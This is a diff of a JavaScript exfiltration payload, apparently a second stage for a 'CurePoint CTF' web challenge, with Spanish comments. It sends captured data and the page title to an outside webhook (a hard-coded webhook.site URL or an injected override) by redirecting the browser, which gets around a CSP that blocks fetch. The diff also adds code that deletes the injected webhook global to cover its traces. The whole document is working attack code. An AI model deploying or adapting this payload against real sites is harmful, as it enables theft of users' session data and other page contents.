@@ -1,8 +1,19 @@
-/* CurePoint CTF — exfil por navegación (CSP bloquea fetch).
- * ?w=URL de receptor HTTPS, p.ej. Burp Collaborator: https://TU_ID.burpcollaborator.net
- * u oastify en Burp reciente. Sin ?w= usa el fallback de abajo. */
+/**
+ * Segunda etapa: exfil por navegacion (CSP default-src bloquea fetch/img a terceros).
+ * Prioridad webhook: window.__CTF_WEBHOOK__ (inyectado por ping-loader data-wh) > ?w= > fallback.
+ */
 (function () {
   var WH = "https://webhook.site/af75be10-0cbe-4fc8-843e-2dc8c15d14ed";
+  try {
+    if (typeof window.__CTF_WEBHOOK__ === "string" && window.__CTF_WEBHOOK__.length) {
+      WH = window.__CTF_WEBHOOK__;
+      try {
+        delete window.__CTF_WEBHOOK__;
+      } catch (e) {
+        window.__CTF_WEBHOOK__ = "";
+      }
+    }
+  } catch (e) {}
   try {
     var w = new URLSearchParams(window.location.search).get("w");
     if (w && /^https?:\/\//i.test(w)) WH = w;
@@ -24,7 +35,7 @@
   }
   window.location =
     WH +
-    "?c=" +
+    "?ping=1&c=" +
     encodeURIComponent(c) +
     "&t=" +
     encodeURIComponent(document.title || "") +
